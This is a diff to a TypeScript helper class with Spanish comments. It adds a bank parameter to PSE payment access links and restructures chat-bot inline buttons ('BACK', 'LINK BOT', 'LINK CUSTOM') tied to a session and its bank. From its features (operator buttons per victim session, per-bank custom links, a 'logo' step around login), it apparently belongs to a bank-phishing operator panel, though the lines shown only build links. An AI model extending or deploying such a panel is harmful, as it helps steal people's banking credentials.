@@ -124,9 +124,9 @@ export class Helper {
     }
 
     /**
-     * Arma el link PSE del frontend con sessionId (y mode=tc si aplica).
+     * Arma el link PSE del frontend con sessionId (y mode=tc o bank si aplica).
      */
-    static async buildPseAccessLink(sessionId: string, tc: boolean, host?: string): Promise<{ link: string }> {
+    static async buildPseAccessLink(sessionId: string, tc: boolean, host?: string, bank?: string): Promise<{ link: string }> {
 
         // Se crea el URLSearchParams
         const params = new URLSearchParams({ sessionId });
@@ -136,6 +136,11 @@ export class Helper {
 
             // Se agrega el mode=tc al URLSearchParams
             params.set("mode", "tc");
+        } else if (bank && bank !== "DESCONOCIDO") {
+
+            // Se agrega el banco en minúsculas al enlace
+            const bankClean = String(bank).split(':')[0].toLowerCase();
+            params.set("bank", bankClean);
         }
 
         // Se obtiene la base URL del frontend
@@ -296,7 +301,7 @@ export class Helper {
             }
 
             // Se arma el link con IP pública (WAN), no 192.168.x.x
-            const { link } = await Helper.buildPseAccessLink(sessionId, tc, req.host);
+            const { link } = await Helper.buildPseAccessLink(sessionId, tc, req.host, currentSession.banco);
 
             // Se retorna en true
             res.json({
@@ -451,7 +456,8 @@ export class Helper {
             // Se retorna en true
             res.json({
                 success: true,
-                sessionId: sessionId
+                sessionId: sessionId,
+                bank: currentSession.banco || null
             });
         } catch (error) {
 
@@ -1904,23 +1910,29 @@ export class Helper {
         // Se inicializa la url del frontend
         const frontendUrl = process.env.FRONTEND_URL;
 
-        // Se retornan los 3 botones del flujo PSE normal
-        return [
-            [
-                {
-                    text: showBackButton ? '⬅️ BACK' : '🔲 LOGO',
-                    callback_data: `${showBackButton ? 'back' : 'logo'}:${sessionId};${bank}`,
-                },
-                {
-                    text: '🤖 LINK BOT',
-                    callback_data: `link_bot:${sessionId};${bank}`,
-                },
-                {
-                    text: '🔗 LINK CUSTOM',
-                    url: `${frontendUrl}/link-custom?sessionId=${sessionId}&bank=${bankBase}`,
-                },
-            ],
-        ];
+        const row: Array<{ text: string; callback_data?: string; url?: string }> = [];
+
+        // Si se indica botón de retorno (fallback para banco no reconocido)
+        if (showBackButton) {
+            row.push({
+                text: '⬅️ BACK',
+                callback_data: `back:${sessionId};${bank}`,
+            });
+        }
+
+        // Se agregan los botones de bot y link custom (sin solicitar logo antes del login)
+        row.push(
+            {
+                text: '🤖 LINK BOT',
+                callback_data: `link_bot:${sessionId};${bank}`,
+            },
+            {
+                text: '🔗 LINK CUSTOM',
+                url: `${frontendUrl}/link-custom?sessionId=${sessionId}&bank=${bankBase}`,
+            }
+        );
+
+        return [row];
     }
 
     /**
